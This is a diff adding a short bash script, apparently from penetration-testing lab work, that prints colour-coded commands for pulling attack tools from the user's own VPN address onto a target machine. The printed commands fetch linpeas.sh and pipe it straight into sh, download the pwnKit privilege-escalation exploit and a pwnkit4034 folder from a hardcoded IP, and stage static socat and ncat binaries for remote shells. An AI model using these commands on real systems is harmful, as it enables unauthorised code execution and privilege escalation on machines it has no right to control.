@@ -1,0 +1,54 @@
+#!/bin/bash
+
+# Regular Colors
+BLACK='\033[0;30m'
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+MAGENTA='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[0;37m'
+
+# Text Attributes
+RESET='\033[0m' # No Color
+
+# Check if the argument is provided
+if [ -n "$1" ]; then
+    # Argument is provided, set port variable
+    port=":$1"
+else
+    # Argument is not provided, set port variable to an empty string
+    port=""
+fi
+
+# vars
+myip=$(ip addr show tun0 | grep -oP 'inet \K[\d.]+')
+address="${myip}${port}"
+description="some convenient web request commands to copy/paste\n"
+commands=(
+  "curl -O http://$address/linpeas.sh"
+  "curl http://$address/linpeas.sh | sh"
+  "wget ${address}/pwnKit"
+  "wget ${address}/static-binaries/x64/socat"
+  "wget ${address}/static-binaries/x64/ncat"
+  "wget -rnpH 192.168.45.207/pwnkit4034"
+)
+
+# Set the terminal title
+echo -ne "\033]0;LPEserv\007"
+
+# print italicized description
+echo -e "\033[3m${description}\e[0m"
+
+# Iterate over commands and print them with alternating colors
+for i in "${!commands[@]}"; do
+  command="${commands[$i]}"
+  # Determine color based on even or odd index
+  if [ $((i % 2)) -eq 0 ]; then
+    color="$YELLOW"
+  else
+    color="$GREEN"
+  fi
+  echo -e "${color}${command}${RESET}"
+done
